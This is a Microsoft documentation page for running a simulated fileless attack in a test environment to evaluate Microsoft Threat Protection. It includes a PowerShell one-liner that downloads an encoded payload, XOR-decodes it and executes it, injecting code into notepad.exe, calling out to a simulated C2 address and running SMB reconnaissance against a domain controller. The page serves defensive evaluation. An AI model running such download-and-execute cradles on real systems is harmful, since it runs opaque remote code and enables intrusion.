---
title: Run your Microsoft Threat Protection attack simulations 
description: Run your pilot Microsoft Threat Protection project to effectively determine the benefit and adoption of Microsoft Threat Protection (MTP)
keywords: Microsoft Threat Protection pilot, run pilot Microsoft Threat Protection project, evaluate Microsoft Threat Protection in production, Microsoft Threat Protection pilot project, cyber security, advanced persistent threat, enterprise security, devices, device, identity, users, data, applications, incidents, automated investigation and remediation, advanced hunting
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection: M365-security-compliance 
ms.topic: conceptual
---

# Run your Microsoft Threat Protection attack simulations  

**Applies to:**
- Microsoft Threat Protection

To test the Microsoft Threat Protection capabilities for your pilot project, we will simulate a sophisticated attack that leverages advanced techniques to hide from detection. The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users’ devices. This category of attacks usually doesn’t include files dropped on the victim’s device—they occur solely in memory. They “live off the land” by using existing system and administrative tools and inject their code into system processes to hide their execution, allowing them to evade detection and persist on the device.

In this simulation, our sample scenario starts with a PowerShell script. A user might be tricked into running a script. Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network. Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.

During the simulation, the attack injects shellcode into a seemingly innocent process. In this scenario, we’ll use notepad.exe. We chose this process for the simulation, but attackers will more likely target a long-running system process, such as svchost.exe. The shellcode then goes on to contact the attacker’s command-and-control (C2) server to receive instructions on how to proceed. In addition, the script attempts executing reconnaissance queries against the domain controller (DC). This allows an attacker to get information about recent user login information. Once attackers have this information, they can move laterally in the network to get to a specific sensitive account


>[!IMPORTANT]
>For optimum results, follow the attack simulation instructions as closely as possible.


## Test environment requirements

There are two devices used in this scenario: a test device and a domain controller.

1.	Verify your tenant has [Protection](https://docs.microsoft.com/en-us/microsoft-365/security/mtp/mtp-enable#starting-the-service)￼￼ .
2.	Configure a test domain controller:
    - Set up a device with Windows Server 2008 R2 or a later version.
    - Onboard the test domain controller to [Azure Advanced Threat Protection](https://docs.microsoft.com/en-us/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/en-us/windows-server/administration/server-manager/configure-remote-management-in-server-manager).    
    - Enable [Azure ATP and Microsoft Cloud App Security integration](https://docs.microsoft.com/en-us/cloud-app-security/aatp-integration).
    - Create a test user on your domain – no admin permissions needed.

3.	Configure a test device:
    <br>
    a.	Requires Windows 10 version 1903 or a later version.
    <br>
    b.	Join the test device to the test domain.
    <br>
    c.	[Turn on Windows Defender Antivirus](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
    <br>
    d.	[Onboard to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.


## Run the simulation

To run the attack scenario simulation:

1.	Log in to the test device with the test user account.

2.	Open a Windows PowerShell window on the test device.

3.	Copy the following simulation script:
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
-UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```
>[!NOTE]
>If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks. Download this document and open it on Adobe Reader.

4. At the prompt, paste and run the copied script.

>[!NOTE]
>If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the CTRL-V hotkey or right-click-paste method might not work.  Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.

A few seconds later, notepad.exe will open. A simulated attack code will be injected into notepad.exe. Keep the automatically generated Notepad instance open to experience the full scenario.

The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller via SMB.

You will see a message displayed on the PowerShell console when this script completes.

```
ran NetSessionEnum against [DC Name] with return code result 0      
```

To see the Automated Incident and Response feature in action, keep the notepad.exe process open. You will see Automated Incident and Response stop the Notepad process.


## Investigate an incident

The following are out of scope of this deployment guide:

## Resolve the incident
The following are out of scope of this deployment guide:



## Next step
|||
|:-------|:-----|
|![Phase 4: Closing & summary](../../media/prepare.png) <br>[Phase 4: Closing & summary](prepare-mtpeval.md) | Analyze your Microsoft Threat Protection pilot outcome, present them to your stakeholders, and take the next step.
